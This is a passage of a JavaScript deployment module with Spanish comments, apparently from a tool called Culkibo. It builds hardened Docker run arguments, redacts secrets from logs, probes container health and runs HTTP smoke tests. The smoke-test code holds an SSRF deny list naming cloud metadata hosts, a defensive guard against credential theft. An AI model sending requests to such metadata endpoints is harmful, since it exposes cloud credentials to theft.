   *   stopGracePeriodSec?: number, logDriver?: string, logMaxSizeMb?: number, logMaxFiles?: number,
   *   labels?: Record<string, any>, protectedContainer?: boolean, sleeping?: boolean}} spec
   * @returns {string[]}
   */
  runArgs({
    containerName,
    imageTag,
    hostPort,
    containerPort,
    envNames = [],
    envFile = null,
    network = DEFAULTS.network,
    memoryMb = DEFAULTS.memoryMb,
    cpus = DEFAULTS.cpus,
    pidsLimit = DEFAULTS.pidsLimit,
    healthCmd = null,
    healthStartPeriodSec = DEFAULTS.healthStartPeriodSec,
    healthRetries = DEFAULTS.healthRetries,
    stopGracePeriodSec = DEFAULTS.stopGracePeriodSec,
    logDriver = DEFAULTS.logDriver,
    logMaxSizeMb = DEFAULTS.logMaxSizeMb,
    logMaxFiles = DEFAULTS.logMaxFiles,
    labels = {},
    protectedContainer = false,
    sleeping = false
  }) {
    const safeStopTimeout = sanitizeBoundedInt(stopGracePeriodSec, DEFAULTS.stopGracePeriodSec, 5, 300);
    const rawDriver = String(logDriver || DEFAULTS.logDriver).trim().toLowerCase();
    const safeLogDriver = ALLOWED_LOG_DRIVERS.has(rawDriver) ? rawDriver : DEFAULTS.logDriver;
    const safeLogMaxSizeMb = sanitizeBoundedInt(logMaxSizeMb, DEFAULTS.logMaxSizeMb, 1, 500);
    const safeLogMaxFiles = sanitizeBoundedInt(logMaxFiles, DEFAULTS.logMaxFiles, 1, 20);
    const args = [
      'run', '-d',
      '--init',
      '--name', containerName,
      // Reinicio ante caída del proceso o del host. Sin esto no es un servicio
      // de producción, es un proceso que casualmente está vivo.
      '--restart', 'unless-stopped',
      // Gracia explícita SIGTERM→SIGKILL (5..300s, default 30s) para no truncar transacciones HTTP/BD
      '--stop-timeout', String(safeStopTimeout),
      // El contenedor solo debe ser alcanzable por el proxy y por la sonda de
      // salud del daemon; nunca directamente desde internet.
      '-p', `127.0.0.1:${hostPort}:${containerPort}`,
      '--memory', `${memoryMb}m`,
      // Igualar swap a memoria desactiva el swap del contenedor: preferimos un
      // OOM rápido y visible a una app que agoniza intercambiando páginas.
      '--memory-swap', `${memoryMb}m`,
      '--cpus', String(cpus),
      '--pids-limit', String(pidsLimit),
      '--security-opt', 'no-new-privileges',
      '--cap-drop', 'ALL',
      ...(Number(containerPort) < 1024 ? ['--cap-add', 'NET_BIND_SERVICE'] : []),
      // Kamal #1709 / Dokku #4388: emitir max-size/max-file SOLO en drivers compatibles (json-file/local)
      '--log-driver', safeLogDriver,
      ...(SIZE_ROTATION_LOG_DRIVERS.has(safeLogDriver)
        ? ['--log-opt', `max-size=${safeLogMaxSizeMb}m`, '--log-opt', `max-file=${safeLogMaxFiles}`]
        : [])
    ];

    if (network) args.push('--network', network);

    if (envFile) {
      args.push('--env-file', envFile);
    }
    for (const name of envNames) {
      if (isValidEnvName(name)) args.push('-e', name);
    }

    if (healthCmd) {
      const startPeriod = sanitizeBoundedInt(healthStartPeriodSec, DEFAULTS.healthStartPeriodSec, 0, 300);
      const retries = sanitizeBoundedInt(healthRetries, DEFAULTS.healthRetries, 1, 10);
      args.push(
        '--health-cmd', healthCmd,
        '--health-interval', '10s',
        '--health-timeout', '3s',
        '--health-retries', String(retries),
        '--health-start-period', `${startPeriod}s`
      );
    }

    /** @type {Record<string, any>} */
    const effectiveLabels = { ...(labels || {}) };
    if (protectedContainer || sleeping) {
      effectiveLabels[PROTECTED_CONTAINER_LABEL] = '1';
    }
    if (sleeping) {
      effectiveLabels['culkibo.sleeping'] = '1';
    }

    for (const [key, value] of Object.entries(effectiveLabels)) {
      if (/^[a-z0-9.\-_]+$/i.test(key)) args.push('--label', `${key}=${String(value).slice(0, 200)}`);
    }

    args.push(imageTag);
    return args;
  }

  // -------------------------------------------------------------------------
  // Utilidades de red y puertos
  // -------------------------------------------------------------------------

  /**
   * Crea la red de Culkibo si no existe. Idempotente y cacheada 60 s por nodo.
   * @param {string} [name]
   * @param {{ env?: any, cacheKey?: string | null }} [opts]
   */
  async ensureNetwork(name = DEFAULTS.network, { env = undefined, cacheKey = null } = {}) {
    const key = cacheKey ? `${cacheKey}:${name}` : name;
    const now = Date.now();
    const cachedAt = this._networkCache.get(key);
    if (cachedAt && (now - cachedAt) < 60000) return true;
    const inspect = await this.runDocker(['network', 'inspect', name], { timeoutMs: 8000, env });
    if (inspect.code === 0) {
      this._networkCache.set(key, now);
      return true;
    }
    const created = await this.runDocker(['network', 'create', name], { timeoutMs: 10000, env });
    if (created.code === 0) {
      this._networkCache.set(key, now);
      return true;
    }
    return false;
  }

  /**
   * ¿Con qué dirección debe hablar Caddy al contenedor?
   *
   * Si Caddy corre en un contenedor, `127.0.0.1` del host NO es su loopback:
   * marcarlo así produce una ruta que apunta a la nada. Lo correcto es
   * adjuntarlo a la red de Culkibo y marcar el nombre del contenedor. Si Caddy
   * corre nativo en el host, `127.0.0.1:<puertoHost>` sí es correcto.
   *
   * @param {{ containerName: string, containerPort: number, hostPort: number, network?: string, env?: any }} spec
   */
  async resolveUpstream({ containerName, containerPort, hostPort, network = DEFAULTS.network, env = undefined }) {
    const caddyName = DEFAULTS.caddyContainerName;
    const inspect = await this.runDocker(
      ['inspect', '-f', '{{json .NetworkSettings.Networks}}', caddyName],
      { timeoutMs: 8000, env }
    );

    if (inspect.code !== 0) {
      // Caddy no es un contenedor de esta máquina: es nativo o remoto.
      return { dial: `127.0.0.1:${hostPort}`, mode: 'host' };
    }

    let networks = {};
    try { networks = JSON.parse((inspect.stdout || '{}').trim()) || {}; } catch (e) {}
    if (!networks[network]) {
      const connected = await this.runDocker(['network', 'connect', network, caddyName], { timeoutMs: 10000, env });
      if (connected.code !== 0) {
        // No se pudo adjuntar: caemos al host, que al menos funciona si Caddy
        // publica puertos con acceso al gateway.
        return { dial: `127.0.0.1:${hostPort}`, mode: 'host', warning: connected.stderr.trim() };
      }
    }
    return { dial: `${containerName}:${containerPort}`, mode: 'network' };
  }

  /** Puerto libre coordinado con portRegistry (rango 20000–24999, sin solape con catálogo ni puertos efímeros). */
  async findFreePort(start = 20000, owner = `deploy_${Date.now()}`) {
    const port = await portRegistry.allocate({
      kind: 'deploy',
      owner,
      start,
      end: Math.max(start + 4999, 24999),
      extraExcluded: this._pendingPorts
    });
    this._pendingPorts.add(port);
    return port;
  }

  /**
   * Resuelve bases de datos gestionadas vinculadas o pertenecientes al proyecto:
   * devuelve sus redes aisladas (`culkibo_net_<id>`) y variables de entorno
   * descifradas en memoria (jamás se guardan contraseñas en projects.json).
   */
  resolveLinkedDatabases(project) {
    /** @type {Set<string>} */
    const networks = new Set();
    /** @type {Record<string, string>} */
    const injectedEnv = {};
    /** @type {string[]} */
    const secretValues = [];
    /** @type {string[]} */
    const linkedNames = [];

    const dbm = getDatabaseManager();
    if (!dbm || typeof dbm.list !== 'function') {
      return { networks: [], injectedEnv, secretValues, linkedNames };
    }

    const explicitIds = new Set(Array.isArray(project.linkedDatabaseIds) ? project.linkedDatabaseIds : []);
    const allDbs = dbm.list();
    const matched = allDbs.filter((d) => d && (d.projectId === project.id || explicitIds.has(d.id)));

    for (const db of matched) {
      if (db.networkName) networks.add(db.networkName);
      linkedNames.push(`${db.name} (${db.engine})`);
      try {
        const creds = dbm.getCredentials(db.id);
        const connStr = creds && (creds.internalConnectionString || creds.connectionString)
          ? String(creds.internalConnectionString || creds.connectionString)
          : null;
        if (connStr) {
          secretValues.push(connStr);
          if (creds.password) secretValues.push(String(creds.password));
          const eng = String(db.engine || '').toLowerCase();
          if (eng === 'redis' || eng === 'valkey') {
            if (!injectedEnv.REDIS_URL) injectedEnv.REDIS_URL = connStr;
          } else if (eng === 'mongodb') {
            if (!injectedEnv.MONGODB_URI) injectedEnv.MONGODB_URI = connStr;
            if (!injectedEnv.DATABASE_URL) injectedEnv.DATABASE_URL = connStr;
          } else {
            if (!injectedEnv.DATABASE_URL) injectedEnv.DATABASE_URL = connStr;
          }
        }
      } catch (e) {}
    }

    return { networks: Array.from(networks), injectedEnv, secretValues, linkedNames };
  }

  // -------------------------------------------------------------------------
  // Registro y notificación
  // -------------------------------------------------------------------------

  /**
   * Elimina de un texto cualquier valor que coincida con un secreto conocido.
   *
   * La salida de un build o de un contenedor puede volcar el entorno (un
   * `console.log(process.env)`, un stack trace de una librería de config). Si
   * eso llega al log en vivo del panel, el secreto se filtra a cualquiera que
   * mire la pantalla.
   */
  redact(text, secrets = []) {
    let out = String(text == null ? '' : text);
    for (const secret of secrets) {
      if (typeof secret === 'string' && secret.length >= 8) {
        out = out.split(secret).join('***');
      }
    }
    return out;
  }

  log(deployment, level, message) {
    const safe = this.redact(message, deployment.__secrets || []).slice(0, 4000);
    const entry = { at: new Date().toISOString(), level, message: safe };
    deployment.logLines.push(entry);
    // Se conservan las últimas 800 líneas: suficiente para diagnosticar un
    // build fallido sin que un `npm ci` verboso reviente la memoria.
    if (deployment.logLines.length > 800) deployment.logLines.shift();

    if (containerOrchestrator) {
      containerOrchestrator.addLog(level, 'citadel', safe, new Date(), deployment.projectId);
    }
    this.emit('deploy_log', { deploymentId: deployment.id, projectId: deployment.projectId, ...entry });
  }

  setStatus(deployment, status, extra = {}) {
    deployment.status = status;
    Object.assign(deployment, extra);
    this.emit('deploy_event', {
      deploymentId: deployment.id,
      projectId: deployment.projectId,
      status,
      kind: deployment.kind || 'deploy',
      imageTag: deployment.imageTag,
      upstream: deployment.upstream,
      hostnames: deployment.hostnames,
      commit: (deployment.git && deployment.git.shortCommit) || null,
      startedAt: deployment.startedAt || null,
      finishedAt: deployment.finishedAt || null,
      durationMs: deployment.durationMs || null,
      phaseTimings: deployment.phaseTimings || null,
      error: deployment.error || null
    });
  }

  notify(payload) {
    if (!notificationService) return;
    Promise.resolve(notificationService.notify(payload)).catch(() => {});
  }

  // -------------------------------------------------------------------------
  // 4. Sonda de salud
  // -------------------------------------------------------------------------

  /**
   * Espera a que el destino nuevo responda antes de mandarle tráfico.
   *
   * Usa `http.request` nativo (`_smokeHttpRequest`) para transmitir la cabecera `Host`
   * real (que `fetch()`/undici ignora como cabecera prohibida), respeta periodo de gracia
   * de arranque (`healthStartPeriodSec`) y exige `healthyThreshold` respuestas sanas
   * consecutivas antes de dar luz verde al tráfico.
   *
   * Dos condiciones de parada, no una:
   *   a) el sondeo HTTP alcanza `healthyThreshold` respuestas consecutivas válidas;
   *   b) el contenedor deja de estar en ejecución o entra en crash-loop — falla rápido
   *      sin desperdiciar el timeout completo.
   */
  /**
   * @param {{ hostPort?: number | null, containerPort?: number | null, healthPath: string, containerName?: string | null, hostHeader?: string | null, timeoutMs: number, intervalMs: number, healthStartPeriodSec?: number, healthGraceMs?: number | null, healthyThreshold?: number, onProgress?: ((msg: string) => void) | null, signal?: AbortSignal | null, isRemote?: boolean, dockerEnv?: any }} spec
   */
  async waitForHealth({
    hostPort,
    containerPort = null,
    healthPath,
    containerName,
    hostHeader = null,
    timeoutMs,
    intervalMs,
    healthStartPeriodSec = 0,
    healthGraceMs = null,
    healthyThreshold = DEFAULTS.healthyThreshold,
    onProgress = null,
    signal = null,
    isRemote = false,
    dockerEnv = undefined
  }) {
    const startAt = Date.now();
    const graceMs = healthGraceMs != null
      ? Math.min(300000, Math.max(0, Number(healthGraceMs) || 0))
      : sanitizeBoundedInt(healthStartPeriodSec, 0, 0, 300) * 1000;
    const threshold = sanitizeBoundedInt(healthyThreshold, DEFAULTS.healthyThreshold, 1, 5);
    const effectiveTimeoutMs = graceMs > 0 ? Math.max(timeoutMs, graceMs + Math.min(5000, timeoutMs)) : timeoutMs;
    const deadline = startAt + effectiveTimeoutMs;
    const isContainerized = !isRemote && fs.existsSync('/.dockerenv');
    const probeUrls = [];
    if (isContainerized && containerName && containerPort) {
      probeUrls.push(`http://${containerName}:${containerPort}${healthPath}`);
    }
    if (hostPort) {
      probeUrls.push(`http://127.0.0.1:${hostPort}${healthPath}`);
    }
    if (probeUrls.length === 0) {
      return { healthy: false, attempts: 0, reason: 'No hay puerto ni contenedor configurado para sondeo de salud' };
    }
    const isCustomHealthPath = Boolean(healthPath && healthPath !== '/');
    /** @type {Record<string, string>} */
    const probeHeaders = hostHeader && /^[a-z0-9.-]+(?::\d{1,5})?$/i.test(String(hostHeader))
      ? { Host: String(hostHeader) }
      : {};
    let attempts = 0;
    let consecutiveOk = 0;
    let lastError = 'sin respuesta';
    const backoff = [100, 150, 250, 500];

    while (Date.now() < deadline) {
      if (signal && signal.aborted) {
        return { healthy: false, attempts, reason: 'Verificación de salud cancelada', aborted: true };
      }
      attempts++;

      // Sondeo HTTP nativo (transmite `Host` real y nunca sigue redirecciones).
      let attemptPassed = false;
      let passedStatus = 0;
      for (const url of probeUrls) {
        try {
          const reqTimeoutMs = Math.min(5000, Math.max(500, intervalMs * 4));
          const res = await this._smokeHttpRequest(url, {
            method: 'GET',
            headers: probeHeaders,
            timeoutMs: reqTimeoutMs,
            signal,
            needBody: false
          });
          const ok = isCustomHealthPath ? (res.status >= 200 && res.status < 400) : (res.status >= 100 && res.status < 500);
          if (ok) {
            attemptPassed = true;
            passedStatus = res.status;
            break;
          }
          lastError = `respondió ${res.status}`;
        } catch (err) {
          if (signal && signal.aborted) {
            return { healthy: false, attempts, reason: 'Verificación de salud cancelada', aborted: true };
          }
          lastError = err && err.name === 'TimeoutError' ? 'tiempo de espera agotado' : 'conexión rechazada';
        }
      }

      if (attemptPassed) {
        consecutiveOk++;
        if (consecutiveOk >= threshold) {
          return { healthy: true, attempts, status: passedStatus, consecutiveOk };
        }
        const confirmWaitMs = Math.min(intervalMs, 150);
        await new Promise((r) => {
          const t = setTimeout(r, confirmWaitMs);
          if (signal) {
            const onAb = () => { clearTimeout(t); r(undefined); };
            signal.addEventListener('abort', onAb, { once: true });
          }
        });
        continue;
      }

      consecutiveOk = 0;

      // Comprobar si el contenedor murió o entró en crash-loop (`State.Restarting`) cuando el HTTP aún no responde.
      if (containerName) {
        const state = await this.runDocker(
          ['inspect', '-f', '{{.State.Running}}|{{.State.Restarting}}|{{.RestartCount}}', containerName],
          { timeoutMs: 5000, signal, env: dockerEnv }
        );
        if (state.aborted) {
          return { healthy: false, attempts, reason: 'Verificación de salud cancelada', aborted: true };
        }
        if (state.code === 0) {
          const [runningFlag, restartingFlag, restartCountRaw] = (state.stdout || '').trim().split('|');
          const restartCount = parseInt(restartCountRaw || '0', 10) || 0;
          if (runningFlag === 'false' || restartingFlag === 'true' || restartCount > 0) {
            return {
              healthy: false,
              attempts,
              reason: restartingFlag === 'true' || restartCount > 0
                ? `El contenedor entró en bucle de reinicios durante el arranque (reinicios: ${restartCount})`
                : 'El contenedor se detuvo durante el arranque (revisa los logs de la build)'
            };
          }
        }
      }

      const inGrace = graceMs > 0 && (Date.now() - startAt) < graceMs;
      if (onProgress && attempts % 5 === 0) {
        onProgress(
          `Esperando a que el servicio responda en ${healthPath} (intento ${attempts}: ${lastError}${inGrace ? ' — en periodo de gracia de arranque' : ''})`
        );
      }
      const waitMs = attempts <= backoff.length ? Math.min(intervalMs, backoff[attempts - 1]) : intervalMs;
      await new Promise((r) => {
        const t = setTimeout(r, waitMs);
        if (signal) {
          const onAb = () => { clearTimeout(t); r(undefined); };
          signal.addEventListener('abort', onAb, { once: true });
        }
      });
    }

    return { healthy: false, attempts, reason: `No respondió en ${Math.round(effectiveTimeoutMs / 1000)} s (${lastError})` };
  }

  /**
   * Petición HTTP nativa para smoke tests (`http`/`https` lazy-loaded):
   * - Respeta la cabecera `Host` explícita (que `fetch()`/undici ignora como forbidden header).
   * - Nunca sigue redirecciones (0 SSRF por 3xx).
   * - Acota la lectura del cuerpo a `maxBytes` (256 KB) en streaming real.
   *
   * @param {string} targetUrl
   * @param {{ method: string, headers: Record<string, string>, body?: string | null, timeoutMs: number, signal?: AbortSignal | null, needBody: boolean, maxBytes?: number }} opts
   * @returns {Promise<{ status: number, bodyText: string, truncated: boolean }>}
   */
  _smokeHttpRequest(targetUrl, { method, headers, body = null, timeoutMs, signal = null, needBody, maxBytes = MAX_SMOKE_BODY_BYTES }) {
    return new Promise((resolve, reject) => {
      if (signal && signal.aborted) {
        const err = new Error('Smoke test cancelado');
        err.name = 'AbortError';
        return reject(err);
      }
      const parsed = new URL(targetUrl);
      const isHttps = parsed.protocol === 'https:';
      const mod = isHttps ? require('https') : require('http');
      const payloadBuf = (body != null && method !== 'GET' && method !== 'HEAD') ? Buffer.from(body, 'utf8') : null;
      /** @type {Record<string, string>} */
      const reqHeaders = { ...headers };
      if (payloadBuf) reqHeaders['Content-Length'] = String(payloadBuf.length);

      let settled = false;
      /** @type {ReturnType<typeof setTimeout> | null} */
      let timer = null;
      const cleanup = () => {
        if (timer) { clearTimeout(timer); timer = null; }
        if (signal) signal.removeEventListener('abort', onAbort);
      };
      const done = (err, val) => {
        if (settled) return;
        settled = true;
        cleanup();
        if (err) reject(err);
        else resolve(val);
      };

      const req = mod.request(
        {
          hostname: parsed.hostname === 'localhost' ? '127.0.0.1' : parsed.hostname,
          port: parsed.port ? Number(parsed.port) : (isHttps ? 443 : 80),
          path: `${parsed.pathname || '/'}${parsed.search || ''}`,
          method,
          headers: reqHeaders,
          agent: false
        },
        (res) => {
          const status = res.statusCode || 0;
          if (!needBody) {
            res.resume();
            res.once('end', () => done(null, { status, bodyText: '', truncated: false }));
            res.once('error', (err) => done(err, null));
            return;
          }
          /** @type {Buffer[]} */
          const chunks = [];
          let total = 0;
          let truncated = false;
          res.on('data', (chunk) => {
            if (truncated) return;
            const buf = Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk);
            const remaining = maxBytes - total;
            if (buf.length > remaining) {
              if (remaining > 0) chunks.push(buf.subarray(0, remaining));
              total = maxBytes;
              truncated = true;
              res.destroy();
              done(null, { status, bodyText: Buffer.concat(chunks, total).toString('utf8'), truncated: true });
              return;
            }
            chunks.push(buf);
            total += buf.length;
          });
          res.once('end', () => {
            done(null, { status, bodyText: Buffer.concat(chunks, total).toString('utf8'), truncated });
          });
          res.once('error', (err) => {
            if (truncated) return;
            done(err, null);
          });
        }
      );

      const onAbort = () => {
        const err = new Error('Smoke test cancelado');
        err.name = 'AbortError';
        req.destroy(err);
        done(err, null);
      };
      if (signal) signal.addEventListener('abort', onAbort, { once: true });

      timer = setTimeout(() => {
        const err = new Error(`Timeout (${timeoutMs} ms)`);
        err.name = 'TimeoutError';
        req.destroy(err);
        done(err, null);
      }, timeoutMs);
      if (timer.unref) timer.unref();

      req.once('error', (err) => done(err, null));
      if (payloadBuf) req.end(payloadBuf);
      else req.end();
    });
  }

  /**
   * Lee el cuerpo de una respuesta Fetch acotado estrictamente a `maxBytes` (256 KB)
   * cuando un llamante inyecta un `fetchImpl` personalizado.
   * @param {any} res
   * @param {number} [maxBytes]
   * @returns {Promise<{ text: string, truncated: boolean }>}
   */
  async _readCappedResponseText(res, maxBytes = MAX_SMOKE_BODY_BYTES) {
    if (!res) return { text: '', truncated: false };
    if (res.body && typeof res.body.getReader === 'function') {
      const reader = res.body.getReader();
      /** @type {Uint8Array[]} */
      const chunks = [];
      let total = 0;
      let truncated = false;
      try {
        while (true) {
          const { done, value } = await reader.read();
          if (done) break;
          if (value && value.byteLength > 0) {
            const remaining = maxBytes - total;
            if (value.byteLength > remaining) {
              if (remaining > 0) chunks.push(value.subarray(0, remaining));
              total = maxBytes;
              truncated = true;
              try { await reader.cancel(); } catch (e) {}
              break;
            }
            chunks.push(value);
            total += value.byteLength;
          }
        }
      } finally {
        try { reader.releaseLock(); } catch (e) {}
      }
      const buf = Buffer.concat(chunks.map((c) => Buffer.from(c.buffer, c.byteOffset, c.byteLength)), total);
      return { text: buf.toString('utf8'), truncated };
    }
    if (typeof res.text === 'function') {
      const raw = String(await res.text());
      const truncated = Buffer.byteLength(raw, 'utf8') > maxBytes;
      return { text: raw.slice(0, maxBytes), truncated };
    }
    return { text: '', truncated: false };
  }

  /**
   * Resuelve el origen base seguro de un upstream para smoke tests (nunca sigue URLs externas arbitrarias).
   * @param {string | { hostPort?: number | null, containerName?: string | null, containerPort?: number | null, isRemote?: boolean }} upstream
   * @returns {string}
   */
  _resolveSmokeBaseUrl(upstream) {
    if (upstream && typeof upstream === 'object') {
      const isContainerized = !upstream.isRemote && fs.existsSync('/.dockerenv');
      if (isContainerized && upstream.containerName && upstream.containerPort) {
        return `http://${upstream.containerName}:${upstream.containerPort}`;
      }
      if (upstream.hostPort) {
        return `http://127.0.0.1:${upstream.hostPort}`;
      }
      throw new Error('Upstream de smoke test sin puerto ni contenedor válido');
    }
    const raw = String(upstream || '').trim();
    if (!raw || /[\s\r\n\0]/.test(raw)) {
      throw new Error('Upstream de smoke test inválido');
    }
    const withProto = /^https?:\/\//i.test(raw) ? raw : `http://${raw}`;
    const parsed = new URL(withProto);
    if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
      throw new Error(`Protocolo de upstream no permitido: ${parsed.protocol}`);
    }
    if (parsed.username || parsed.password) {
      throw new Error('Credenciales embebidas no permitidas en upstream de smoke test');
    }
    const cleanHost = parsed.hostname.toLowerCase().replace(/^\[|\]$/g, '');
    const forbiddenMetaHosts = new Set(['metadata', 'metadata.google.internal', 'metadata.goog', 'instance-data']);
    if (
      !cleanHost ||
      forbiddenMetaHosts.has(cleanHost) ||
      cleanHost.endsWith('.internal') ||
      cleanHost.endsWith('.goog') ||
      isMetadataIp(cleanHost)
    ) {
      throw new Error('Upstream de smoke test bloqueado por protección SSRF (metadatos cloud)');
    }
    const isLoopback = cleanHost === '127.0.0.1' || cleanHost === 'localhost' || cleanHost === '::1';
    const isLocalContainerHost = (cleanHost.startsWith('culkibo_') && /^[a-z0-9_.-]{1,80}$/.test(cleanHost))
      || /^[a-z0-9][a-z0-9_-]{0,63}$/.test(cleanHost);
    if (!isLoopback && !isLocalContainerHost) {
      throw new Error(`Upstream de smoke test fuera de loopback/contenedor local bloqueado: ${cleanHost.slice(0, 64)}`);
    }
    return `${parsed.protocol}//${parsed.host}`;
  }

  /**
   * Ejecuta pruebas de humo HTTP deterministas contra el contenedor candidato o activo:
   * - Sin SSRF (solo rutas relativas validadas con `sanitizeSmokePath`, `redirect: 'manual'`).
   * - Sin ReDoS (búsqueda literal `String.includes()` únicamente, cero RegExp de usuario).
   * - Cuerpo acotado a 256 KB y cabeceras hop-by-hop/`Host` bloqueadas en config de usuario.
   *
   * @param {string | { hostPort?: number | null, containerName?: string | null, containerPort?: number | null, isRemote?: boolean }} upstream
   * @param {any[] | { enabled?: boolean, failPolicy?: string, checks?: any[] }} smokeTests
   * @param {{ hostHeader?: string | null, signal?: AbortSignal | null, secrets?: string[], fetchImpl?: typeof fetch | null }} [options]
   */
  async runSmokeTests(upstream, smokeTests, options = {}) {
    const started = Date.now();
    const checks = Array.isArray(smokeTests)
      ? smokeTests.slice(0, 10)
      : (smokeTests && typeof smokeTests === 'object' && Array.isArray(smokeTests.checks)
          ? smokeTests.checks.slice(0, 10)
          : []);
    if (checks.length === 0) {
      return { ok: true, passed: 0, failed: 0, total: 0, durationMs: 0, checks: [], summary: 'Sin smoke tests configurados' };
    }

    const baseUrl = this._resolveSmokeBaseUrl(upstream);
    const secrets = Array.isArray(options.secrets) ? options.secrets : [];
    const signal = options.signal || null;
    const customFetch = typeof options.fetchImpl === 'function' ? options.fetchImpl : null;
    const safeHostHeader = options.hostHeader && /^[a-z0-9.-]+(?::\d{1,5})?$/i.test(String(options.hostHeader))
      ? String(options.hostHeader)
      : null;

    /** @type {any[]} */
    const results = [];
    let passed = 0;
    let failed = 0;
    const forbiddenJsonKeys = new Set(['__proto__', 'constructor', 'prototype']);

    for (let i = 0; i < checks.length; i++) {
      const chk = checks[i] || {};
      const label = chk.name ? String(chk.name).slice(0, 80) : `check_${i + 1}`;
      const cleanPath = sanitizeSmokePath(chk.path);
      if (!cleanPath) {
        failed++;
        results.push({
          name: label,
          path: String(chk.path || '').slice(0, 80),
          ok: false,
          status: null,
          latencyMs: 0,
          attempts: 0,
          error: 'Ruta de smoke test inválida (debe ser relativa empezando por /, sin .. ni URLs completas)'
        });
        continue;
      }

      const methodRaw = String(chk.method || 'GET').toUpperCase();
      const method = (methodRaw === 'HEAD' || methodRaw === 'POST') ? methodRaw : 'GET';
      const expectedStatus = chk.expectStatus !== undefined
        ? chk.expectStatus
        : (chk.expectedStatus !== undefined ? chk.expectedStatus : '2xx');
      const expectBodyContains = chk.expectBodyContains !== undefined
        ? chk.expectBodyContains
        : (chk.bodyContains !== undefined ? chk.bodyContains : null);
      const bodyNotContains = chk.bodyNotContains !== undefined ? chk.bodyNotContains : null;
      const maxLatencyMs = chk.maxLatencyMs !== undefined && chk.maxLatencyMs !== null && Number.isFinite(Number(chk.maxLatencyMs))
        ? Number(chk.maxLatencyMs)
        : null;
      const timeoutMs = Math.min(15000, Math.max(50, Number(chk.timeoutMs) || 5000));
      const retries = Math.min(3, Math.max(0, parseInt(String(chk.retries ?? 0), 10) || 0));

      /** @type {Record<string, string>} */
      const reqHeaders = {};
      if (safeHostHeader) reqHeaders.Host = safeHostHeader;
      if (chk.headers && typeof chk.headers === 'object' && !Array.isArray(chk.headers)) {
        let hCount = 0;
        for (const [hk, hv] of Object.entries(chk.headers)) {
          if (hCount >= 10) break;
          if (/^[A-Za-z0-9-]+$/.test(hk) && !SMOKE_BLOCKED_HEADERS.test(hk) && typeof hv === 'string') {
            reqHeaders[hk] = hv.replace(/[\r\n\0]/g, '').slice(0, 512);
            hCount++;
          }
        }
      }

      /** @type {any} */
      let lastResult = null;
      for (let attempt = 1; attempt <= retries + 1; attempt++) {
        if (signal && signal.aborted) {
          lastResult = {
            name: label, path: cleanPath, method, ok: false, status: null, latencyMs: 0, attempts: attempt,
            error: 'Smoke test cancelado'
          };
          break;
        }
        const t0 = Date.now();
        try {
          const needBody = method !== 'HEAD' && (expectBodyContains != null || bodyNotContains != null || chk.jsonPathEquals != null);
          const reqBody = method === 'POST' && typeof chk.body === 'string' ? chk.body.slice(0, 16384) : null;
          let resStatus = 0;
          let bodyText = '';

          if (customFetch) {
            const reqTimeout = AbortSignal.timeout(timeoutMs);
            const combinedSignal = (signal && typeof AbortSignal.any === 'function')
              ? AbortSignal.any([signal, reqTimeout])
              : reqTimeout;
            /** @type {any} */
            const fetchOpts = {
              method,
              headers: reqHeaders,
              redirect: 'manual',
              signal: combinedSignal
            };
            if (reqBody !== null) fetchOpts.body = reqBody;
            const res = await customFetch(`${baseUrl}${cleanPath}`, fetchOpts);
            resStatus = res.status;
            if (needBody) {
              const read = await this._readCappedResponseText(res, MAX_SMOKE_BODY_BYTES);
              bodyText = read.text;
            } else if (res.body && typeof res.body.cancel === 'function') {
              try { await res.body.cancel(); } catch (e) {}
            }
          } else {
            const nativeRes = await this._smokeHttpRequest(`${baseUrl}${cleanPath}`, {
              method,
              headers: reqHeaders,
              body: reqBody,
              timeoutMs,
              signal,
              needBody,
              maxBytes: MAX_SMOKE_BODY_BYTES
            });
            resStatus = nativeRes.status;
            bodyText = nativeRes.bodyText;
          }
          const latencyMs = Date.now() - t0;

          /** @type {string[]} */
          const errors = [];

          // 1. Verificar código de estado HTTP
          let statusOk = false;
          if (typeof expectedStatus === 'number') {
            statusOk = resStatus === expectedStatus;
          } else if (Array.isArray(expectedStatus)) {
            statusOk = expectedStatus.includes(resStatus);
          } else if (typeof expectedStatus === 'string' && /^[1-5]xx$/i.test(expectedStatus)) {
            statusOk = Math.floor(resStatus / 100) === Number(expectedStatus[0]);
          } else {
            statusOk = resStatus >= 200 && resStatus < 300;
          }
          if (!statusOk) {
            errors.push(`Estado HTTP ${resStatus} (esperado ${Array.isArray(expectedStatus) ? expectedStatus.join('/') : expectedStatus})`);
          }

          // 2. Verificar latencia máxima
          if (maxLatencyMs !== null && latencyMs > maxLatencyMs) {
            errors.push(`Latencia ${latencyMs} ms superó el límite de ${maxLatencyMs} ms`);
          }

          // 3. Verificar contenido literal (cero RegExp = 0 ReDoS)
          if (typeof expectBodyContains === 'string' && expectBodyContains.length > 0) {
            if (!bodyText.includes(expectBodyContains.slice(0, 256))) {
              errors.push(`El cuerpo no contiene el texto esperado`);
            }
          }
          if (typeof bodyNotContains === 'string' && bodyNotContains.length > 0) {
            if (bodyText.includes(bodyNotContains.slice(0, 256))) {
              errors.push(`El cuerpo contiene una cadena prohibida`);
            }
          }

          // 4. Verificar jsonPathEquals seguro (Object.hasOwn, profundidad <= 5, bloquea prototype pollution)
          if (chk.jsonPathEquals && typeof chk.jsonPathEquals === 'object' && typeof chk.jsonPathEquals.path === 'string') {
            const segs = chk.jsonPathEquals.path.trim().split('.').filter(Boolean);
            if (segs.length === 0 || segs.length > 5 || segs.some((s) => forbiddenJsonKeys.has(s))) {
              errors.push('Ruta jsonPathEquals inválida o prohibida');
            } else {
              try {
                let cur = JSON.parse(bodyText);
                let found = true;
                for (const seg of segs) {
                  if (cur !== null && typeof cur === 'object' && Object.prototype.hasOwnProperty.call(cur, seg)) {
                    cur = cur[seg];
                  } else {
                    found = false;
                    break;
                  }
                }
                if (!found || cur !== chk.jsonPathEquals.value) {
                  errors.push(`jsonPathEquals ${chk.jsonPathEquals.path} no coincide con el valor esperado`);
                }
              } catch (jsonErr) {
                errors.push('La respuesta no es JSON válido para jsonPathEquals');
              }
            }
          }

          lastResult = {
            name: label,
            path: cleanPath,
            method,
            ok: errors.length === 0,
            status: resStatus,
            latencyMs,
            attempts: attempt,
            error: errors.length > 0 ? this.redact(errors.join('; '), secrets).slice(0, 400) : null
          };
          if (lastResult.ok) break;
        } catch (err) {
          const latencyMs = Date.now() - t0;
          const msg = err && err.name === 'TimeoutError'
            ? `Timeout (${timeoutMs} ms)`
            : this.redact(String((err && err.message) || 'Error de conexión'), secrets).slice(0, 300);
          lastResult = {
            name: label,
            path: cleanPath,
            method,
